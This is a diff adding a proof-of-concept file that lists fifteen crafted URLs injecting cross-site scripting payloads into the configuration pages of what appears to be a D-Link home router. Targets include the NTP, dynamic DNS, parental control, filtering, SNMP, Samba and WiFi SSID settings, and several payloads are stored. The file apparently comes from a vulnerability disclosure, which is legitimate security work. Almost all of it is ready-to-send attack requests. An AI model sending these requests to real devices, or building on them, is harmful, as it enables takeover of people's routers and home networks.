@@ -1,0 +1,58 @@
+==========================
+PoC
+==========================
+
+
+1) NTS Settings
+http://www.example.com/sntpcfg.cgi?ntp_enabled=1&ntpServer1=locahost%22;alert%28%27XSS%27%29;//&ntpServer2=time-nw.nist.gov&ntpServer3=&ntpServer4=&ntpServer5=&timezone_offset=+02:00&timezone=Jerusalem&use_dst=0
+
+2) Dynamic DNS (Reflected/Stored)
+http://www.example.com/ddnsmngr.cmd?action=add&service=1&hostname=aaaa&username=%3cscript%3ealert(%27xss%27)%3c%2fscript%3e&password=zzzzzz&iface=ppp0
+
+3)Parental Control
+http://www.example.com/todmngr.tod?action=add&username=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E&mac=f1:de:f1:ab:cb:6d&days=1&start_time=571&end_time=732
+
+4) URL Filtering
+http://www.example.com/urlfilter.cmd?action=set_url&TodUrlAdd=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&port_num=80
+
+5) NAT - Port Triggering
+http://www.example.com/scprttrg.cmd?action=add&appName=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&dstWanIf=ppp0&tStart=1111,&tEnd=1112,&tProto=1,&oStart=11,&oEnd=11,&oProto=1,
+
+6) IP Filtering:
+http://www.example.com/scoutflt.cmd?action=add&fltName=<script>alert('XSS')</script>&protocol=1&srcAddr=10.0.0.10&srcMask=255.255.255.0&srcPort=80&dstAddr=10.0.0.12&dstMask=255.255.255.0&dstPort=8080
+
+7) IP Filtering - Removal Error:
+http://www.example.com/scoutflt.cmd?action=remove&rmLst=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
+
+8) Interface Grouping (also reflected on "Local Area Network (LAN) Setup"):
+http://www.example.com/portmapcfg.cmd?action=add&groupName=<Script>alert('XSS')</script>&choiceBox=|usb0|wl0|&wanIfName=atm1
+
+9) SNMP
+http://www.example.com/snmpconfig.cgi?snmpStatus=1&snmpRoCommunity=%27;alert(%27XSS%27)&snmpRwCommunity=private&snmpSysName=D-LINK&snmpSysContact=unknown&snmpSysLocation=unknown&snmpTrapIp=0.0.0.0
+
+10) Incoming IP Filter:
+http://www.example.com/scinflt.cmd?action=add&wanIf=ppp0&fltName=<script>alert('XSS&protocol=2&srcAddr=SS')</script>&srcMask=255.255.255.0&srcPort=80&dstAddr=10.0.0.10&dstMask=255.255.255.0&dstPort=8080
+
+11) Policy Routing Add:
+http://www.example.com/prmngr.cmd?action=add&PolicyName=<script>alert('X&SourceIp=SS');</script>&lanIfcName=wl0&wanIf=ppp0&defaultgw=10.0.0.111
+
+12)Policy Routing -Removal Error:
+http://www.example.com/prmngr.cmd?action=remove&rmLst=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
+
+13) Printer Server
+http://www.example.com/ippcfg.cmd?action=savapply&ippEnabled=1&ippMake=aa&ippName=aa";alert('XSS-Printer-Sever');//
+
+14) SAMBA Configuration
+http://www.example.com/samba.cgi?enableSmb=1&smbNetBiosName=';var x="XSS";//&smbDirName=b';alert(x);//&smbUtf8DirName=bbb&smbCharset=utf8&smbUnplug=nolug=no
+OR
+http://www.example.com/samba.cgi?enableSmb=1&smbNetBiosName=';alert("SAMBA-X&smbDirName=SS");//&smbUtf8DirName=bbb&smbCharset=utf8&smbUnplug=nolug=no
+
+15) WiFi SSID
+Step 1 (Create XSS as Wireless SSID):
+http://www.example.com/wlcfg.wl?wlSsidIdx=0&wlEnbl=1&wlHide=0&wlAPIsolation=0&wlSsid=%3CScript%3Ealert(%27XSSID%27)%3C/script%3E&wlCountry=IL&wlMaxAssoc=16&wlDisableWme=0&wlEnableWmf=0&wlEnbl_wl0v1=0&wlSsid_wl0v1=wl0_Guest1&wlHide_wl0v1=0&wlAPIsolation_wl0v1=0&wlDisableWme_wl0v1=0&wlEnableWmf_wl0v1=0&wlMaxAssoc_wl0v1=16&wlEnbl_wl0v2=0&wlSsid_wl0v2=wl0_Guest2&wlHide_wl0v2=0&wlAPIsolation_wl0v2=0&wlDisableWme_wl0v2=0&wlEnableWmf_wl0v2=0&wlMaxAssoc_wl0v2=16&wlEnbl_wl0v3=0&wlSsid_wl0v3=wl0_Guest3&wlHide_wl0v3=0&wlAPIsolation_wl0v3=0&wlDisableWme_wl0v3=0&wlEnableWmf_wl0v3=0&wlMaxAssoc_wl0v3=16
+
+Step 2:
+Goto the Wireless -> Security [http://www.example.com/wlsecurity.html]
+OR
+Goto the Wireless -> MAC Filter [http://
+www.example.com/wlmacflt.cmd?action=view]
